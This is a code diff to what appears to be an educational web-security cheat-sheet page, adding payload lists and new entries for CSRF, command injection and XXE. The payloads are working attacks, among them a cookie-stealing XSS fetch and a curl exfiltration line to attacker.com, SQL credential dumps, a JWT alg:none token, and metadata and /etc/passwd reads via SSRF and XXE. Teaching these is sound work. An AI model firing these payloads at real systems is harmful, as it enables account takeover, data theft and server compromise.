@@ -34,33 +34,100 @@ const vulnData = [
   { name: '🎭 XSS — Cross-Site Scripting', color: '#ff2d55',
     desc: 'Inject scripts into pages viewed by other users. Chain with other bugs for ATO.',
     checks: ['Reflected XSS in search/URL params','Stored XSS in profile fields, comments','DOM-based XSS via location.hash','postMessage XSS — no origin check','Bypass WAF with encoding, case variation','Check innerHTML, eval(), document.write()'],
+    payloads: [
+      "<script>alert(document.domain)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "\"><script>alert(1)</script>",
+      "javascript:alert(1)",
+      "data:text/html,<script>alert(1)</script>",
+      "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
+    ],
     anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Sends payload in URL</div><div class="atk-arrow-line"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">Web App</div></div><div class="atk-arrow"><div class="atk-arrow-text">Reflects script in page</div><div class="atk-arrow-line amber"></div></div><div class="atk-actor"><div class="atk-icon">👤</div><div class="atk-label">Victim</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Hacker crafts malicious URL</div><div class="atk-step"><span class="atk-step-num">2</span>Victim clicks the link</div><div class="atk-step"><span class="atk-step-num">3</span>Script runs in victim browser</div><div class="atk-step"><span class="atk-step-num">4</span>Cookies / session stolen!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Full Account Takeover</span></div></div>`
   },
   { name: '💉 SQL Injection', color: '#ff6d00',
     desc: 'Inject SQL into database queries via input fields, headers, cookies.',
     checks: ['Error-based: single quote test \'','Boolean: 1 AND 1=1 vs 1 AND 1=2','Time-based: SLEEP(5), WAITFOR DELAY','UNION-based: find column count first','sqlmap -u "URL?id=1" --dbs --batch'],
+    payloads: [
+      "' OR 1=1 --",
+      "' UNION SELECT NULL,NULL,username,password FROM users --",
+      "' AND SLEEP(5) --",
+      "'; WAITFOR DELAY '0:0:5' --",
+      "' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --"
+    ],
     anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Sends ' OR 1=1 --</div><div class="atk-arrow-line purple"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">Web App</div></div><div class="atk-arrow"><div class="atk-arrow-text">Broken SQL query</div><div class="atk-arrow-line purple"></div></div><div class="atk-actor"><div class="atk-icon">🗄️</div><div class="atk-label">Database</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload sql">SELECT * FROM users WHERE name='' OR 1=1 --'</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Hacker types ' in login</div><div class="atk-step"><span class="atk-step-num">2</span>App puts input in SQL</div><div class="atk-step"><span class="atk-step-num">3</span>Query returns ALL users</div><div class="atk-step"><span class="atk-step-num">4</span>Full DB dumped!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Full Database Compromise</span></div></div>`
   },
   { name: '🔐 IDOR — Insecure Direct Object Reference', color: '#9b59b6',
     desc: 'Access other users\' objects by changing IDs in requests.',
     checks: ['Change numeric IDs: /users/1001 → /users/1002','Change GUIDs in API calls','Horizontal IDOR: same role, different user','Vertical IDOR: lower role accessing admin','Check all API endpoints, not just UI'],
+    payloads: [
+      "GET /api/v1/users/1002/profile",
+      "PATCH /api/v1/accounts/1002/settings {\"role\":\"admin\"}",
+      "POST /api/v1/orders/1002/receipt",
+      "GET /api/v1/invoices/INV-1002"
+    ],
     anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker (ID:101)</div></div><div class="atk-arrow"><div class="atk-arrow-text">Changes ID to 102</div><div class="atk-arrow-line cyan"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">API Server</div></div><div class="atk-arrow"><div class="atk-arrow-text">No auth check!</div><div class="atk-arrow-line cyan"></div></div><div class="atk-actor"><div class="atk-icon">👤</div><div class="atk-label">Victim (ID:102)</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload idor">GET /api/users/<b>102</b>/profile → Returns victim's data</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>View own profile: /users/101</div><div class="atk-step"><span class="atk-step-num">2</span>Change 101→102 in URL</div><div class="atk-step"><span class="atk-step-num">3</span>Server returns victim data</div><div class="atk-step"><span class="atk-step-num">4</span>Private info exposed!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact high">⚠️ IMPACT: Data Leak / Privacy Breach</span></div></div>`
   },
   { name: '🔑 Authentication Flaws', color: '#00e5ff',
     desc: 'Bypass login, session management, MFA, and password reset flows.',
     checks: ['Default credentials: admin/admin, test/test','Username enumeration via error messages','JWT alg:none attack, RS256→HS256 confusion','Password reset: predictable token?','MFA: brute OTP 0000-9999, skip MFA step','Session not invalidated on logout'],
+    payloads: [
+      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+      "Username: admin' --",
+      "X-Forwarded-For: 127.0.0.1",
+      "X-HTTP-Method-Override: PUT"
+    ],
     anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Skips MFA step</div><div class="atk-arrow-line cyan"></div></div><div class="atk-actor"><div class="atk-icon">🔒</div><div class="atk-label">Login Page</div></div><div class="atk-arrow"><div class="atk-arrow-text">No server check!</div><div class="atk-arrow-line green"></div></div><div class="atk-actor"><div class="atk-icon">🏠</div><div class="atk-label">Dashboard</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload idor">POST /login → Skip /verify-otp → GET /dashboard</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Login with password</div><div class="atk-step"><span class="atk-step-num">2</span>App asks for OTP</div><div class="atk-step"><span class="atk-step-num">3</span>Skip to /dashboard</div><div class="atk-step"><span class="atk-step-num">4</span>Full access without MFA!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Complete Auth Bypass</span></div></div>`
   },
   { name: '⚡ Business Logic', color: '#ffab00',
     desc: 'Exploit the application\'s intended workflow in unintended ways.',
     checks: ['Race conditions in transfers/purchases','Price manipulation: negative values','Workflow bypass: skip payment step','Privilege escalation via mass assignment','Rate limiting bypass on sensitive endpoints'],
+    payloads: [
+      "POST /checkout {\"price\": -100, \"qty\": 1}",
+      "POST /transfer {\"amount\": 100, \"from\": \"user_a\", \"to\": \"user_a\"}",
+      "POST /coupon {\"code\": \"PROMO\", \"apply_count\": 9999}"
+    ],
     anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Sets price = -$100</div><div class="atk-arrow-line amber"></div></div><div class="atk-actor"><div class="atk-icon">🛒</div><div class="atk-label">Checkout</div></div><div class="atk-arrow"><div class="atk-arrow-text">Refund credited!</div><div class="atk-arrow-line green"></div></div><div class="atk-actor"><div class="atk-icon">💰</div><div class="atk-label">Hacker Wallet</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload sql">POST /checkout {"price": -100, "qty": 1} → +$100 refund</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Intercept checkout request</div><div class="atk-step"><span class="atk-step-num">2</span>Change price to negative</div><div class="atk-step"><span class="atk-step-num">3</span>Server processes it</div><div class="atk-step"><span class="atk-step-num">4</span>Money added to account!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact high">⚠️ IMPACT: Financial Fraud</span></div></div>`
   },
   { name: '🌐 SSRF — Server-Side Request Forgery', color: '#00e676',
     desc: 'Make the server issue requests to internal/cloud resources.',
     checks: ['Test URL params: url=, redirect=, webhook=','Target AWS metadata: 169.254.169.254','Bypass filters with encoding, redirection','Blind SSRF via DNS lookup (interactsh)','Cloud IMDS: GCP, Azure, AWS'],
+    payloads: [
+      "GET /fetch?url=http://169.254.169.254/latest/meta-data/",
+      "GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/",
+      "GET /fetch?url=http://127.0.0.1:8080/admin",
+      "GET /fetch?url=http://[::1]/"
+    ],
     anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">url=169.254...</div><div class="atk-arrow-line green"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">Web Server</div></div><div class="atk-arrow"><div class="atk-arrow-text">Fetches internal!</div><div class="atk-arrow-line green"></div></div><div class="atk-actor"><div class="atk-icon">☁️</div><div class="atk-label">AWS Metadata</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload idor">GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>App has "fetch URL" feature</div><div class="atk-step"><span class="atk-step-num">2</span>Point it to internal IP</div><div class="atk-step"><span class="atk-step-num">3</span>Server fetches from internal</div><div class="atk-step"><span class="atk-step-num">4</span>AWS keys leaked!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Cloud Takeover</span></div></div>`
   },
+  { name: '🔄 CSRF — Cross-Site Request Forgery', color: '#e63946',
+    desc: 'Force a victim browser to execute unintended state-changing actions on a trusted web application.',
+    checks: ['Test GET requests for sensitive actions', 'Missing or predictable anti-CSRF tokens', 'CORS with dynamic/wildcard Origin header', 'Samesite cookie attribute set to None'],
+    payloads: [
+      "<form action='https://target.com/api/change-email' method='POST' id='csrf'>\n  <input type='hidden' name='email' value='attacker@evil.com'>\n</form>\n<script>document.getElementById('csrf').submit()</script>"
+    ],
+    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Victim visits evil.com</div><div class="atk-arrow-line red"></div></div><div class="atk-actor"><div class="atk-icon">👤</div><div class="atk-label">Victim Browser</div></div><div class="atk-arrow"><div class="atk-arrow-text">Hidden POST submit</div><div class="atk-arrow-line red"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">Trusted App</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload idor">Cookie: session_token=victim_id (Sent automatically!)</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Victim logs into target.com</div><div class="atk-step"><span class="atk-step-num">2</span>Victim visits malicious page</div><div class="atk-step"><span class="atk-step-num">3</span>Malicious page triggers action</div><div class="atk-step"><span class="atk-step-num">4</span>Browser attaches session cookies!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact high">⚠️ IMPACT: Unauthorized Actions / Privilege Escalation</span></div></div>`
+  },
+  { name: '💻 Command Injection (RCE)', color: '#9b00e8',
+    desc: 'Execute arbitrary shell commands on the server host via a vulnerable application function.',
+    checks: ['Input concatenation into system execution shells', 'Check endpoints dealing with file conversions, pinging, networking', 'Test shell characters: |, &, ;, \\n', 'Check command output or test time-based delay (sleep 10)'],
+    payloads: [
+      "127.0.0.1; cat /etc/passwd",
+      "127.0.0.1 && id",
+      "|| sleep 10",
+      "; curl http://attacker.com/$(whoami)"
+    ],
+    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">ip=; whoami</div><div class="atk-arrow-line purple"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">Ping Engine</div></div><div class="atk-arrow"><div class="atk-arrow-text">Runs shell output</div><div class="atk-arrow-line purple"></div></div><div class="atk-actor"><div class="atk-icon">⚙️</div><div class="atk-label">System Shell</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload sql">system("ping -c 1 " + "; whoami") → Executes command!</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>View network test input field</div><div class="atk-step"><span class="atk-step-num">2</span>Append shell separator (;)</div><div class="atk-step"><span class="atk-step-num">3</span>Input arbitrary terminal code</div><div class="atk-step"><span class="atk-step-num">4</span>Command runs with system privileges!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Full Server Takeover</span></div></div>`
+  },
+  { name: '📦 XXE — XML External Entity', color: '#f39c12',
+    desc: 'Inject reference to an external entity inside XML input, leading to local file disclosure or SSRF.',
+    checks: ['Check if API accepts XML content headers', 'Test with standard public entity identifier', 'Test with internal file targets (file:///etc/passwd)', 'Test for Blind XXE using external HTTP listener'],
+    payloads: [
+      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<r>&xxe;</r>"
+    ],
+    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">XML with entity</div><div class="atk-arrow-line yellow"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">XML Parser</div></div><div class="atk-arrow"><div class="atk-arrow-text">Resolves system file</div><div class="atk-arrow-line yellow"></div></div><div class="atk-actor"><div class="atk-icon">🗄️</div><div class="atk-label">Local File System</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload sql">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Send XML request body to API</div><div class="atk-step"><span class="atk-step-num">2</span>Define system ENTITY payload</div><div class="atk-step"><span class="atk-step-num">3</span>Inject reference &amp;xxe; in tag</div><div class="atk-step"><span class="atk-step-num">4</span>API echoes passwd file content!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Local File Disclosure / SSRF</span></div></div>`
+  }
 ];
 
 const toolsData = [
